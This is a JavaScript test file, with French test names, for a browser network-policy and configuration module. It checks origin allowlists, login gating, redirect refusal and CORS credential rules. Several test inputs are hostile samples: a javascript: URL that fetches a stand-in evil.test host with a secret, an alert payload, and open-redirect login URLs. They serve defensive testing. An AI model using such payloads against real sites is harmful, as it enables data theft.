import assert from "node:assert/strict";
import { describe, test } from "node:test";

import {
  buildBrowserForwardOptions,
  createBrowserRequestGate,
  evaluateCredentialedCorsResponse,
  evaluateCredentialedLoginPreflight,
  evaluateBrowserTarget,
  isAllowedBrowserRequest,
  isExactLoginRequest,
  isRedirectStatus,
  NO_REDIRECT_OR_RETRY,
  safeBrowserTargetLabel,
} from "../lib/network-policy.mjs";
import {
  E2EConfigurationError,
  parseE2EOptIn,
  parseSafeOrigin,
  readE2EConfiguration,
} from "../lib/runtime-config.mjs";

const validEnvironment = Object.freeze({
  ACP_E2E: "1",
  ACP_E2E_BASE_URL: "https://app.example.test",
  ACP_E2E_ALLOWED_ORIGIN: "https://app.example.test",
  ACP_E2E_API_ORIGIN: "https://api.example.test",
  ACP_E2E_LOGIN: "e2e-owner",
  ACP_E2E_PASSWORD: "correct-horse-battery-staple",
  ACP_E2E_RUN_ID: "run-123",
});

describe("evaluateBrowserTarget", () => {
  const origins = new Set(["https://app.example.test", "http://127.0.0.1:8000"]);

  test("applique la même allowlist aux transports HTTP et WebSocket", () => {
    assert.deepEqual(evaluateBrowserTarget("https://app.example.test/missions", origins), {
      allowed: true,
      kind: "http",
      origin: "https://app.example.test",
    });
    assert.deepEqual(evaluateBrowserTarget("wss://app.example.test/stream", origins), {
      allowed: true,
      kind: "websocket",
      origin: "https://app.example.test",
    });
    assert.deepEqual(evaluateBrowserTarget("ws://127.0.0.1:8000/stream", origins), {
      allowed: true,
      kind: "websocket",
      origin: "http://127.0.0.1:8000",
    });
  });

  test("refuse les origines et schémas réseau inattendus", () => {
    assert.equal(evaluateBrowserTarget("wss://evil.example.test/stream", origins).allowed, false);
    assert.deepEqual(evaluateBrowserTarget("ftp://app.example.test/file", origins), {
      allowed: false,
      kind: "unexpected-scheme",
      origin: null,
    });
    assert.deepEqual(evaluateBrowserTarget("javascript:alert(1)", origins), {
      allowed: false,
      kind: "unexpected-scheme",
      origin: null,
    });
  });

  test("autorise seulement les schémas locaux explicites", () => {
    assert.equal(evaluateBrowserTarget("about:blank", origins).allowed, true);
    assert.equal(evaluateBrowserTarget("data:text/plain,ok", origins).allowed, true);
    assert.equal(evaluateBrowserTarget("blob:https://app.example.test/id", origins).allowed, true);
    assert.equal(evaluateBrowserTarget("not a url", origins).allowed, false);
  });

  test("expurge identifiants, requête et fragment du diagnostic", () => {
    assert.equal(
      safeBrowserTargetLabel("https://user:secret@app.example.test/path?token=hidden#value", "GET"),
      "GET https://app.example.test/path",
    );
    assert.equal(
      safeBrowserTargetLabel("javascript:fetch('https://evil.test/?secret=value')", "NAVIGATE"),
      "NAVIGATE javascript:<expurgé>",
    );
  });

  test("n'autorise comme mutation que le POST exact de connexion", () => {
    assert.equal(isAllowedBrowserRequest(
      "https://api.example.test/auth/login",
      "POST",
      origins,
      "https://api.example.test",
    ), false);
    const completeOrigins = new Set([...origins, "https://api.example.test"]);
    assert.equal(isAllowedBrowserRequest(
      "https://api.example.test/auth/login",
      "POST",
      completeOrigins,
      "https://api.example.test",
    ), true);
    assert.equal(isAllowedBrowserRequest(
      "https://api.example.test/auth/login?redirect=evil",
      "POST",
      completeOrigins,
      "https://api.example.test",
    ), false);
    assert.equal(isAllowedBrowserRequest(
      "https://api.example.test/missions",
      "POST",
      completeOrigins,
      "https://api.example.test",
    ), false);
    assert.equal(isAllowedBrowserRequest(
      "https://app.example.test/missions/1",
      "DELETE",
      completeOrigins,
      "https://api.example.test",
    ), false);
  });

  test("reconnaît le login exact sans accepter variante ni redirection déclarée", () => {
    assert.equal(isExactLoginRequest(
      "https://api.example.test/auth/login",
      "post",
      "https://api.example.test",
    ), true);
    assert.equal(isExactLoginRequest(
      "https://api.example.test/auth/login/",
      "POST",
      "https://api.example.test",
    ), false);
    assert.equal(isExactLoginRequest(
      "https://api.example.test/auth/login?next=https://evil.test",
      "POST",
      "https://api.example.test",
    ), false);
  });

  test("admet une seule tentative de connexion puis échoue fermé", () => {
    const completeOrigins = new Set([...origins, "https://api.example.test"]);
    const gate = createBrowserRequestGate(completeOrigins, "https://api.example.test");
    assert.deepEqual(gate.snapshot(), { loginAttempts: 0 });
    assert.deepEqual(gate.authorize("https://api.example.test/auth/login", "POST"), {
      allowed: true,
      exactLogin: true,
      reason: "login",
    });
    assert.deepEqual(gate.authorize("https://api.example.test/auth/login", "POST"), {
      allowed: false,
      exactLogin: true,
      reason: "duplicate-login",
    });
    assert.deepEqual(gate.snapshot(), { loginAttempts: 2 });
  });

  test("n'ouvre pas une origine API absente de l'allowlist", () => {
    const gate = createBrowserRequestGate(origins, "https://api.example.test");
    assert.deepEqual(gate.authorize("https://api.example.test/auth/login", "POST"), {
      allowed: false,
      exactLogin: true,
      reason: "network-policy",
    });
    assert.deepEqual(gate.snapshot(), { loginAttempts: 1 });
  });

  test("ne confond pas les lectures avec le compteur de connexion", () => {
    const completeOrigins = new Set([...origins, "https://api.example.test"]);
    const gate = createBrowserRequestGate(completeOrigins, "https://api.example.test");
    assert.equal(gate.authorize("https://api.example.test/auth/status", "GET").allowed, true);
    assert.equal(gate.authorize("https://api.example.test/auth/logout", "POST").allowed, false);
    assert.deepEqual(gate.snapshot(), { loginAttempts: 0 });
  });

  test("classe toute réponse 3xx comme redirection", () => {
    assert.equal(isRedirectStatus(299), false);
    assert.equal(isRedirectStatus(300), true);
    assert.equal(isRedirectStatus(307), true);
    assert.equal(isRedirectStatus(399), true);
    assert.equal(isRedirectStatus(400), false);
    assert.equal(isRedirectStatus("302"), false);
  });

  test("fige les appels réseau sensibles sans redirection ni retry", () => {
    assert.deepEqual(NO_REDIRECT_OR_RETRY, { maxRedirects: 0, maxRetries: 0 });
    assert.equal(Object.isFrozen(NO_REDIRECT_OR_RETRY), true);
  });

  test("conserve les lectures sur les origines autorisées", () => {
    const completeOrigins = new Set([...origins, "https://api.example.test"]);
    assert.equal(isAllowedBrowserRequest(
      "https://app.example.test/missions",
      "GET",
      completeOrigins,
      "https://api.example.test",
    ), true);
    assert.equal(isAllowedBrowserRequest(
      "https://api.example.test/runs/1/events",
      "OPTIONS",
      completeOrigins,
      "https://api.example.test",
    ), true);
    assert.equal(isAllowedBrowserRequest(
      "https://evil.example.test/collect",
      "GET",
      completeOrigins,
      "https://api.example.test",
    ), false);
  });
});

describe("buildBrowserForwardOptions", () => {
  test("transmet les en-têtes et le corps choisis par Chromium sans jar de cookies implicite", () => {
    const body = Buffer.from('{"login":"e2e-owner"}');
    const options = buildBrowserForwardOptions("POST", {
      Authorization: "Bearer browser-token",
      Cookie: "acp_session=browser-cookie",
      Origin: "https://app.example.test",
      "Content-Length": "999",
      Connection: "keep-alive, X-Hop",
      Host: "api.example.test",
      "X-Hop": "transport-only",
    }, body);

    assert.equal(options.method, "POST");
    assert.equal(options.data, body);
    assert.deepEqual(options.headers, {
      authorization: "Bearer browser-token",
      cookie: "acp_session=browser-cookie",
      origin: "https://app.example.test",
    });
    assert.equal(options.failOnStatusCode, false);
    assert.equal(options.maxRedirects, 0);
    assert.equal(options.maxRetries, 0);
    assert.equal(options.timeout, 30_000);
  });

  test("force un Cookie vide lorsque Chromium n'en a envoyé aucun", () => {
    const headers = { Accept: "application/json" };
    const options = buildBrowserForwardOptions("OPTIONS", headers, null);

    assert.deepEqual(options.headers, {
      accept: "application/json",
      cookie: "",
    });
    assert.equal("data" in options, false);
    assert.deepEqual(headers, { Accept: "application/json" });
  });
});

describe("evaluateCredentialedLoginPreflight", () => {
  const validHeaders = Object.freeze({
    "Access-Control-Allow-Origin": "https://app.example.test",
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Accept, Content-Type",
  });

  test("exige la réponse CORS credentialed exacte du serveur", () => {
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, validHeaders, "https://app.example.test"),
      { allowed: true, reason: "ok" },
    );
  });

  test("refuse redirection, wildcard et absence des capacités demandées", () => {
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(307, validHeaders, "https://app.example.test"),
      { allowed: false, reason: "status" },
    );
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, {
        ...validHeaders,
        "Access-Control-Allow-Origin": "*",
      }, "https://app.example.test"),
      { allowed: false, reason: "origin" },
    );
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, {
        ...validHeaders,
        "Access-Control-Allow-Credentials": "false",
      }, "https://app.example.test"),
      { allowed: false, reason: "credentials" },
    );
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, {
        ...validHeaders,
        "Access-Control-Allow-Methods": "GET, OPTIONS",
      }, "https://app.example.test"),
      { allowed: false, reason: "method" },
    );
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, {
        ...validHeaders,
        "Access-Control-Allow-Headers": "Accept",
      }, "https://app.example.test"),
      { allowed: false, reason: "header" },
    );
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, {
        ...validHeaders,
        "Access-Control-Allow-Methods": "GET, post, OPTIONS",
      }, "https://app.example.test"),
      { allowed: false, reason: "method" },
    );
    assert.deepEqual(
      evaluateCredentialedLoginPreflight(204, {
        ...validHeaders,
        "Access-Control-Allow-Credentials": "TRUE",
      }, "https://app.example.test"),
      { allowed: false, reason: "credentials" },
    );
  });
});

describe("evaluateCredentialedCorsResponse", () => {
  test("exige aussi les en-têtes credentialed sur la vraie réponse POST", () => {
    const validHeaders = {
      "access-control-allow-credentials": "true",
      "access-control-allow-origin": "https://app.example.test",
    };
    assert.deepEqual(
      evaluateCredentialedCorsResponse(validHeaders, "https://app.example.test"),
      { allowed: true, reason: "ok" },
    );
    assert.deepEqual(
      evaluateCredentialedCorsResponse({}, "https://app.example.test"),
      { allowed: false, reason: "origin" },
    );
    assert.deepEqual(
      evaluateCredentialedCorsResponse({
        ...validHeaders,
        "access-control-allow-credentials": "TRUE",
      }, "https://app.example.test"),
      { allowed: false, reason: "credentials" },
    );
  });
});

function environment(overrides = {}) {
  return { ...validEnvironment, ...overrides };
}

describe("parseE2EOptIn", () => {
  test("désactive uniquement les valeurs absente, vide et zéro", () => {
    assert.equal(parseE2EOptIn(undefined), false);
    assert.equal(parseE2EOptIn(""), false);
    assert.equal(parseE2EOptIn("0"), false);
    assert.equal(parseE2EOptIn("1"), true);
  });

  test("refuse les opt-in approximatifs", () => {
    assert.throws(() => parseE2EOptIn("true"), E2EConfigurationError);
    assert.throws(() => parseE2EOptIn(" 1"), E2EConfigurationError);
  });
});

describe("parseSafeOrigin", () => {
  test("accepte HTTPS et HTTP uniquement sur loopback", () => {
    assert.equal(parseSafeOrigin({ TARGET: "https://app.example.test" }, "TARGET").origin, "https://app.example.test");
    assert.equal(parseSafeOrigin({ TARGET: "http://localhost:5173" }, "TARGET").origin, "http://localhost:5173");
    assert.equal(parseSafeOrigin({ TARGET: "http://127.0.0.1:8000" }, "TARGET").origin, "http://127.0.0.1:8000");
    assert.equal(parseSafeOrigin({ TARGET: "http://[::1]:5173" }, "TARGET").origin, "http://[::1]:5173");
  });

  test("refuse HTTP distant et les adresses d'écoute", () => {
    assert.throws(() => parseSafeOrigin({ TARGET: "http://app.example.test" }, "TARGET"), /HTTPS/);
    assert.throws(() => parseSafeOrigin({ TARGET: "http://0.0.0.0:5173" }, "TARGET"), /non routable/);
    assert.throws(() => parseSafeOrigin({ TARGET: "http://[::]:5173" }, "TARGET"), /non routable/);
  });

  test("refuse identifiants, sous-chemin, requête et fragment", () => {
    assert.throws(() => parseSafeOrigin({ TARGET: "https://user:secret@app.example.test" }, "TARGET"), /identifiant/);
    assert.throws(() => parseSafeOrigin({ TARGET: "https://app.example.test/acp" }, "TARGET"), /sous-chemin/);
    assert.throws(() => parseSafeOrigin({ TARGET: "https://app.example.test/?token=x" }, "TARGET"), /requête/);
    assert.throws(() => parseSafeOrigin({ TARGET: "https://app.example.test/#studio" }, "TARGET"), /fragment/);
  });
});

describe("readE2EConfiguration", () => {
  test("ne demande aucune URL ni aucun secret lorsque la suite est désactivée", () => {
    assert.deepEqual(readE2EConfiguration({}), { enabled: false });
    assert.deepEqual(readE2EConfiguration({ ACP_E2E: "0" }), { enabled: false });
  });

  test("retourne une configuration canonique quand l'opt-in est complet", () => {
    assert.deepEqual(readE2EConfiguration(validEnvironment), {
      enabled: true,
      baseURL: "https://app.example.test/",
      appOrigin: "https://app.example.test",
      apiOrigin: "https://api.example.test",
      login: "e2e-owner",
      password: "correct-horse-battery-staple",
      runId: "run-123",
    });
  });

  test("exige une confirmation exacte de l'origine web", () => {
    assert.throws(
      () => readE2EConfiguration(environment({ ACP_E2E_ALLOWED_ORIGIN: "https://other.example.test" })),
      /confirmer exactement/,
    );
  });

  test("valide les bornes des données d'authentification et du run", () => {
    assert.throws(() => readE2EConfiguration(environment({ ACP_E2E_PASSWORD: "court" })), /12 et 256/);
    assert.throws(() => readE2EConfiguration(environment({ ACP_E2E_LOGIN: "x".repeat(121) })), /120/);
    assert.throws(() => readE2EConfiguration(environment({ ACP_E2E_RUN_ID: "x".repeat(201) })), /200/);
    assert.throws(() => readE2EConfiguration(environment({ ACP_E2E_RUN_ID: "run\n123" })), /contrôle/);
  });

  test("n'inclut jamais la valeur brute d'une URL invalide dans l'erreur", () => {
    const secretUrl = "https://user:do-not-print@app.example.test";
    assert.throws(
      () => parseSafeOrigin({ TARGET: secretUrl }, "TARGET"),
      (error) => error instanceof E2EConfigurationError && !error.message.includes(secretUrl),
    );
  });
});
